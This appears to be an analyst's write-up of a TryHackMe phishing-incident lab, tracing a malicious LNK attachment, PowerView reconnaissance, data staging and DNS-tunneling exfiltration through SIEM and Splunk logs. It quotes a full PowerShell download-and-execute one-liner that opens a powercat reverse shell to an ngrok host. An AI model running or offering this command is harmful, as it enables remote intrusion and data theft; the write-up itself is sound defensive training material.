We are here to resolve the "<code>Phishing Unfolding</code>" room from <code>TryHackMe</code>. This project is all about walking through a real-world phishing incident from start to finish. I'll be detailing my entire investigation process, from the moment a suspicious email alert popped up in our <code>SIEM</code>, right through to tracking the attacker's every move in <code>Splunk</code>. My goal here is to lay out how I approached this, what evidence I found, and how I pieced together the full attack chain to formulate a concrete remediation plan.            </div>

              <p class="project-details__desc-para">
Here we can see the <code>SIEM</code> alert for a suspicious email. It includes an attachment named <code>ImportantInvoice-February.zip</code>, which was sent to <code>michael.ascot@tryhatme.com</code> from <code>john@hatmakereurope.xyz</code> with the subject "Important: Pending Invoice!". This email served as the initial entry point for the attack.              </p>
              <div class="project-details__img-cont">
                <img

                  class="constrained-image"
                  id="image-2"
                  onclick="showOriginal(this)"
                />
              </div>
              <h3 class="project-details__content-title">Checking the Attachment</h3>
              <p class="project-details__desc-para">
After opening the <code>ImportantInvoice-February.zip</code> on the analyst VM, I saw was the <code>invoice.pdf.lnk</code> file. Knowing that these shortcut files can be tricky and often hide malicious commands, my immediate thought was to grab its file hashes. I used <code>PowerShell</code> to get the <code>SHA256</code> and <code>MD5</code> hashes of <code>invoice.pdf.lnk</code>. This way, I can quickly check these hashes against threat intelligence platforms to see if anyone else has seen this file before and if it's known to be bad. It's a quick way to get some initial context.</p>              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/2-att.png"
                  alt="Netplan Apply Screenshot"
                  class="constrained-image"
                  id="image-3"
                  onclick="showOriginal(this)"
                />
              </div>
              <h3 class="project-details__content-title">Initial Threat Intelligence Check</h3>
              <p class="project-details__desc-para">
So, after getting the hashes for <code>invoice.pdf.lnk</code>, I immediately popped these hashes into a threat intelligence platforms. As you can see in the screenshot, it came back with no results in every search, meaning no one had reported this specific hash before. Now, it's really important to remember that just because a hash isn't found doesn't mean the file isn't malicious. This could just mean it's a very new variant, or perhaps it's highly targeted and hasn't been widely seen. It actually makes me even more suspicious, as attackers often try to generate unique hashes to evade detection. So, while this was a quick check, it certainly wasn't the end of my investigation.</p>
              <div class="project-details__img-cont">
                <img

              <h3 class="project-details__content-title">Spike in SIEM Alerts</h3>
              <p class="project-details__desc-para">
After that initial hash check, I headed back to the <code>SIEM</code> dashboard to see if anything else was popping up related to this incident. As you can see, there's a significant jump in alerts. Specifically, I'm seeing a lot of "<code>Suspicious Parent Child Relationship</code>" alerts, flagged as high severity processes</p>
              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/4-dash.png"
                  alt="Splunk Installation Screenshot"
                  class="constrained-image"
                  id="image-6"
                  onclick="showOriginal(this)"
                />
              </div>
              <h3 class="project-details__content-title">Investigating a High-Severity Alert: DNS Tunneling Spotted!</h3>
              <p class="project-details__desc-para">
Alright, so diving into those high-severity alerts, I picked one to investigate further, specifically alert ID <code>1036</code>, a "<code>Suspicious Parent Child Relationship</code>." The screenshot shows the detailed view of this alert. What immediately jumps out at me is that the <code>process.working_directory</code> points directly to <code>C:\Users\michael.ascot\downloads</code>. This pretty much confirms that these process alerts are highly likely related to the phishing email and the malicious attachment that <code>Michael Ascot</code> opened.</p>
             <p class="project-details__desc-para"> 
Looking closer at the <code>process.command_line</code>, I can see <code>nslookup.exe</code> being run with a suspicious-looking <code>base64</code> encoded string and <code>haz4rdw4re.io</code>. This is a huge red flag! <code>nslookup.exe</code> is a legitimate tool, but when it's being used this way, especially communicating with a suspicious domain, it often indicates <code>DNS tunneling</code>. This is a very stealthy way for attackers to exfiltrate data or establish command and control. The <code>process.parent.name</code> being <code>powershell.exe</code> also aligns perfectly with the incident report, which mentioned <code>PowerShell</code> being used for various stages of the attack, including data exfiltration via <code>DNS tunneling</code>. This alert is a smoking gun for the data exfiltration phase.</p>

              <h3 class="project-details__content-title">Pivoting to Splunk: Focusing on the Compromised Host</h3>
              <p class="project-details__desc-para">
Given the critical alerts coming from <code>win-3450</code> and the clear indicators of compromise, it was time to move beyond the high-level alerts and really dig into the raw data. My next step was to pivot over to <code>Splunk</code>. My plan was to filter the logs specifically for the compromised host, <code>win-3450</code>, to see all activity originating from or targeting it.</p>
              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/6-splunk.png"

              <h3 class="project-details__content-title">Splunk Investigation: 06/04/2025 01:00:13.540 PM - Phishing Attachment Detected</h3>
              <p class="project-details__desc-para">
      Okay, so the first interesting log I pulled from <code>Splunk</code> after filtering for <code>win-3450</code> really ties back to the very beginning of the incident. This <code>sysmon</code> event, specifically <code>event.action: File created (rule: Filecreate)</code>, shows that the <code>ImportantInvoice-February.zip</code> file landed in <code>Michael Ascot</code>'s Outlook temporary internet cache.</p>
              <p class="project-details__desc-para">
  The <code>file.path: C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\R4WK02QB\ImportantInvoice-February.zip</code> clearly indicates it was an attachment from an email, and the <code>process.name: OUTLOOK.EXE</code> confirms it was received via Outlook. This log entry at <code>1:00:13.540 PM</code> (June 4, 2025) perfectly corroborates the initial <code>SIEM</code> alert we saw about the suspicious email. This is basically the system confirming the malicious <code>ZIP</code> file made it onto the host.</p>

              <div class="project-details__img-cont">
                <img

              <h3 class="project-details__content-title">Splunk Investigation: 06/04/2025 1:00:24.540 PM - The LNK File is Extracted</h3>
              <p class="project-details__desc-para">
Following the initial email attachment, this <code>sysmon</code> event at <code>1:00:24.540 PM</code> tells me that <code>explorer.exe</code> (PID <code>3180</code>) created a file stream for <code>invoice.pdf.lnk</code>. This is a pretty significant step because it means the <code>invoice.pdf.lnk</code> file, which was inside that malicious <code>ZIP</code>, has now been extracted to a temporary folder: <code>C:\Users\michael.ascot\AppData\Local\Temp\5\Temp\_ImportantInvoice-Febrary.zip\ImportantInvoice-Febrary\invoice.pdf.lnk</code>. This extraction, initiated by <code>explorer.exe</code>, is very likely what happened right after <code>Michael Ascot</code> clicked on or opened the <code>ZIP</code> file. This is the moment the malicious <code>.lnk</code> file is actually on the file system and ready to be executed. This is the point where the initial payload is about to run!</p>

              <p class="project-details__desc-para">
This log entry, just seconds after the <code>.lnk</code> file was extracted at <code>1:00:25.540 PM</code>, is exactly what I was looking for. It's a <code>sysmon Process Create</code> event, showing <code>explorer.exe</code> (PID <code>3180</code>) spawning <code>powershell.exe</code> (PID <code>3880</code>). This confirms that clicking the <code>invoice.pdf.lnk</code> file directly led to <code>PowerShell</code> being executed.</p>
              <p class="project-details__desc-para">
But the real kicker is the <code>process.command_line</code>. It's a classic malicious <code>PowerShell</code> one-liner: it uses <code>IEX (New-Object System.Net.WebClient).DownloadString()</code> to pull <code>powermac.ps1</code> from a <code>GitHub</code> repository (<code>https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</code>). Immediately after that, it attempts to establish a <code>reverse shell</code> connection using <code>powercat</code> – which is a <code>PowerShell</code> version of <code>Netcat</code>, used for network debugging and creating reverse shells – to <code>2.tcp.ngrok.io</code> on port <code>19282</code>. This is the attacker getting their initial foothold and trying to set up remote access. This log unequivocally confirms the initial compromise described in the incident report!</p>

              <p class="project-details__desc-para">
These next couple of <code>sysmon Process Create</code> events tell me the attacker is starting their reconnaissance. Both of these processes are spawned by <code>powershell.exe</code> (PID <code>9060</code>), which is the attacker's initial shell on the system.</p>
              <p class="project-details__desc-para">
The first log, at <code>1:00:49.540 PM</code>, shows <code>whoami.exe</code> being executed. This is a super common first step for an attacker – they want to know what user context they're operating under on the compromised machine. It's their way of figuring out their current privileges.</p>
              <p class="project-details__desc-para">
Then, just a few seconds earlier at <code>1:00:41.540 PM</code>, I see <code>systeminfo.exe</code> being run. This command provides detailed configuration information about the operating system, hardware, and installed hotfixes. Attackers use this to understand the system's patching level, potential vulnerabilities, and overall environment.</p>
              <p class="project-details__desc-para">
Combined, these two commands clearly indicate the attacker is actively gathering information about the <code>win-3450</code> host. They're trying to map out the environment and see what they've landed on, which is a classic move in the reconnaissance phase of an attack.</p>

At <code>1:01:36.540 PM</code>, I found a <code>sysmon FileCreate</code> event showing <code>PowerView.ps1</code> being downloaded to <code>C:\Users\michael.ascot\Downloads\PowerView.ps1</code>. This file was created by <code>powershell.exe</code> (PID <code>9060</code>), which we know is the attacker's reverse shell session.</p>
              <p class="project-details__desc-para">
<code>PowerView.ps1</code> is a well-known <code>PowerShell</code> script from the <code>PowerSploit</code> framework, specifically designed for <code>Active Directory</code> reconnaissance. Attackers love it because it helps them enumerate users, groups, computers, and other <code>Active Directory</code> objects to find valuable targets and understand the network's layout. This definitely confirms the attacker is systematically gathering information about the environment, looking for juicy targets or privileged accounts to compromise. This is a very common tool in advanced attacks.</p>

              <p class="project-details__desc-para">
Here the attacker is attempting to bypass <code>PowerShell</code>'s execution policy. Normally, <code>PowerShell</code> has security policies in place to prevent unsigned or untrusted scripts from running. By setting <code>ExecutionPolicy Bypass</code>, they're essentially telling <code>PowerShell</code>, "just run whatever I give you, don't worry about the security checks." This is a common tactic for attackers to ensure their malicious scripts, like <code>PowerView.ps1</code> or the <code>reverse shell</code>, can execute freely on the compromised system without being blocked by these built-in security features. It's a clear sign of malicious intent and preparatory steps for further actions.</p>

              <p class="project-details__desc-para">
Here I see that the <code>PowerView.ps1</code> script, which the attacker downloaded earlier, is now being executed on <code>win-3450</code>. The <code>message</code> and <code>powershell.file.script_block_text</code> might look a bit obfuscated with the <code>Reflection.Emit.ModuleBuilder</code> and <code>Reflection.Assembly</code> calls, but this is a common way <code>PowerShell</code> scripts, especially sophisticated ones like <code>PowerView</code>, are invoked. It's essentially running the script in memory to avoid leaving direct command-line traces. The <code>winlog.process.pid: 3728</code> indicates the <code>PowerShell</code> process that's running it. This is the attacker actively performing network reconnaissance, likely enumerating <code>Active Directory</code> to find valuable targets like file servers or domain controllers. They're mapping out the environment and looking for the data they want to steal.</p>

This <code>powershell</code> event is still showing <code>PowerView.ps1</code> in action. While the previous log confirmed its execution, this one gives us a glimpse into the actual code or script block it's running. The <code>message</code> and <code>powershell.file.script_block_text</code> show functions like <code>Test-Connection</code> (which is like pinging) and <code>LDAPProperty</code>.</p>
              <p class="project-details__desc-para">
This confirms that <code>PowerView.ps1</code> isn't just sitting there; it's actively trying to identify and enumerate hosts on the network, likely through pinging, and then querying <code>Active Directory</code> (using <code>LDAP</code>) to gather details about these systems. It's looking for hostnames, properties, and generally mapping out the network environment. This is exactly what a reconnaissance tool does – preparing the attacker for the next phase, which is typically identifying valuable data or further targets. The <code>process.pid: 3728</code> confirms it's the same <code>PowerShell</code> process we saw executing <code>PowerView</code> earlier. They're definitely looking for something specific now.</p>

Here we see that the attacker, still using the same <code>powershell.exe</code> process (PID <code>3728</code>) that was running <code>PowerView</code>, has just created a new directory named <code>exfiltration</code> within <code>Michael Ascot</code>'s Downloads folder. This is a classic staging area. Attackers often create a dedicated folder to collect all the sensitive data they plan to steal before they actually send it out. This confirms that the attacker has completed their reconnaissance and is now moving into the data staging (the attacker prepares the data for exfiltration) phase, getting ready for exfiltration. This is a very critical step in the attack chain.</p>

These two <code>sysmon FileCreate</code> events are the definitive proof of data theft to the staging directory. We can see two files being created within our previously identified <code>exfiltration</code> folder:</p>

I can also see that the attacker is using <code>Robocopy</code>, a robust Windows utility for copying files and directories. It's often favored by attackers because it's built-in, versatile, and can handle large transfers efficiently.</p>

Here we can see this command tells <code>Robocopy</code> to copy files to the <code>C:\Users\michael.ascot\downloads\exfiltration</code> directory. The <code>/E</code> flag is interesting because it means "copy subdirectories, including empty ones," suggesting the attacker might have intended to copy more than just the two files we saw, or was being thorough.</p>

              <p class="project-details__desc-para">
What this means is that immediately after copying the files from the <code>SSF-FinancialRecords</code> network share to the local <code>exfiltration</code> directory, the attacker is now disconnecting the <code>Z:</code> drive mapping. This is a common defensive evasion tactic. By disconnecting the network share, they are trying to remove a direct link to the source of the stolen data, making it slightly harder to trace their activity back to the file server if an analyst were to look at active network connections. It's a quick cleanup step after they've gotten what they needed.</p>

This is a crucial step in the data theft process.

Compressing data makes it much easier and faster to exfiltrate, especially when dealing with multiple files or large datasets, and it can also help to reduce the chances of detection by some network monitoring tools. This confirms they are now fully prepared for the actual data exfiltration.</p>

Here when we're looking closely, the message shows a complex <code>PowerShell</code> command that essentially reads the <code>exfilt8me.zip</code> file (which contains our stolen financial data!) using <code>[System.IO.File]::ReadAllBytes()</code>, then converts it to <code>Base64</code> using <code>[System.Convert]::ToBase64String()</code>. After that, it splits the <code>Base64</code> string into chunks and, crucially, uses <code>nslookup</code> to send each chunk to <code>haz4rdw4re.io</code>. The attacker is encoding the sensitive data and sending it out in small pieces through <code>DNS</code> queries, which can often bypass traditional firewalls and intrusion detection systems because <code>DNS</code> traffic is typically allowed.</p>
              <p class="project-details__desc-para">
This is the definitive evidence of <code>DNS tunneling</code> in action. The attacker is encoding the stolen <code>exfilt8me.zip</code> data and sending it out of our network in small pieces disguised as legitimate <code>DNS</code> queries to their controlled domain, <code>haz4rdw4re.io</code>. This is a highly stealthy way to exfiltrate data and bypass traditional firewalls. This log confirms the data breach is successful.</p>

Here we can notice that the continued use of <code>haz4rdw4re.io</code> as the target domain. However, the <code>base64</code> encoded strings preceding <code>haz4rdw4re.io</code> are different in each log. This is precisely how <code>DNS tunneling</code> works: the attacker breaks the exfiltrated file (in our case, <code>exfilt8me.zip</code>) into smaller chunks, <code>base64</code> encodes each chunk, and then sends them one by one as subdomains in <code>DNS</code> queries to their controlled server.</p>
              <p class="project-details__desc-para">
These multiple <code>nslookup</code> calls with varying <code>base64</code> strings confirm that the data exfiltration is an ongoing process, with the attacker diligently sending the stolen financial data out of our network in a segmented and stealthy manner.

              <p class="project-details__desc-para">
Looking at the <code>process.command_line</code>, it's the familiar malicious <code>PowerShell</code> command we saw at the beginning: <code>powershell.exe -IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell</code>. This is the attacker trying to re-download <code>powermac.ps1</code> and establish another <code>reverse shell</code> connection to <code>2.tcp.ngrok.io</code> on port <code>19282</code>. This is a clear attempt to create a backdoor or <code>reverse shell</code> to ensure they can regain access to <code>win-3450</code> later, even if their initial session is lost.</p>
             <p class="project-details__desc-para">
However, the message also contains <code>Stop-Process</code>. This indicates that immediately after (or alongside) this persistence attempt, the attacker is also trying to gracefully terminate their <code>PowerShell</code> process. This is a common defense evasion tactic, as shutting down their processes can make it harder for security tools or analysts to detect ongoing malicious activity. It's an attempt at cleanup, even while trying to maintain future access. This log shows the attacker trying to solidify their future access while minimizing immediate traces.</p>
